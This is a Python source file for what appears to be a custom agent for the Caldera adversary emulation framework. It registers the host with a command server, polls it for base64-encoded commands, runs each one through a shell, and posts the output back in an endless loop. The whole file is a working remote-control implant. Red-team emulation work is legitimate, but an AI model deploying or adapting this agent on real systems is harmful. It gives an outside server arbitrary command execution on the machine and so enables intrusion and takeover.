import subprocess
import json
import base64
import argparse
import socket
import os
import platform
import time
import requests


class OperationLoop:

    def __init__(self, profile):
        self.profile = profile
        self.file_download_endpoint = "/file/download"
        self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
        #Caldera server gives instructions through an ID and a command encoded base64 (also other parameters). 
        #This instruction_id is like a primary key so that Caldera knows to which instruction corresponds the output given by the agent.
        self.instruction_id = ''

    def start(self):
        self.profile['results'] = []
        print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
        while True:
            try:

                beacon = self._send_beacon()
                self.profile['results'].clear()
                instructions = self._next_instructions(beacon=beacon)
                sleep = self._handle_instructions(instructions)
                time.sleep(sleep)
            except Exception as e:
                print('[-] Operation loop error: %s' % e)
                time.sleep(30)

    def _send_beacon(self):
       
        raw_result = requests.post(self.profile['server'], data=self.encode_to_b64(self.profile)).content.decode('utf-8')
        print("risultatooo" + raw_result)
        result_dict = self.decode_to_json(raw_result)  # from here we can retrieve all parameters given by caldera server
        # Retrieve all needeed parameters
        self.profile['paw'] = result_dict['paw']
        return result_dict

    def _next_instructions(self, beacon):
        # In the first step we'll execute the given instruction
        return json.loads(beacon['instructions'])

    # FORSE QUA BISOGNA CAMBIARE PERCHÈ IN RAGDOLL VA A SCORRERE TRA LE VARIE ISTRUZIONI, MA IO VEDO CHE NE MANDA SEMPRE UNA SOLA
    def _handle_instructions(self, instructions):
       
        if len(instructions) == 1:
            dec = instructions[0]
            command = json.loads(dec)['command']  # the command here is in base64
            self.instruction_id = json.loads(dec)['id']
        else:
            command = ''
        decoded_command = base64.b64decode(command)
        output = subprocess.run(decoded_command, shell=True, capture_output=True)
        response = self.build_response(output)
        # Send back the beacon response to Caldera server
        responseb64 = requests.post(self.profile['server'], data=self.encode_to_b64(response)).content.decode('utf-8')
        beaconanswer = self.decode_to_json(responseb64)
        return beaconanswer['sleep']

    def build_response(self, output):
        
        return dict(
            paw=self.profile['paw'],
            results=[{
                'id': self.instruction_id,
                'output': base64.b64encode(output.stdout).decode('utf-8'),
                # IMPORTANT: Caldera expects to find the results base64 encoded. It is a must do it here, even if shortly after we're going to encode the entire payload of the http post.
                'status': output.returncode,
                'pid': os.getpid()
            }]
        )

    @staticmethod
    def decode_to_json(s):
        result = base64.b64decode(s)
        result_dict = json.loads(result)
        return result_dict

    @staticmethod
    def encode_to_b64(s):
        responsejson = json.dumps(s).encode('utf-8')
        stringb64 = base64.b64encode(responsejson).decode('utf-8')
        return stringb64


def build_profile(server_addr):
    return dict(
        server=server_addr,
        host=socket.gethostname(),
        platform=platform.system().lower(),
        executors=['sh'],
        pid=os.getpid()
    )


# Typical "if" in python's script. It checks if the script was executed directly as a script (opposed as if it was a submodule)
if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False,
                        default='http://localhost:8888/beacon')  # Like Ragdoll Agent but different endpoint, if not specified (with -W, remember the /beacon!!) the default URL will be that one
    # In the original agent (private repo), here'll go another argument for the url of the remote agent
    args = parser.parse_args()
    try:
        p = build_profile('%s' % args.website)
        OperationLoop(profile=p).start()

    except Exception as e:
        print('[-] Web page may not be accessible, or: %s' % e)
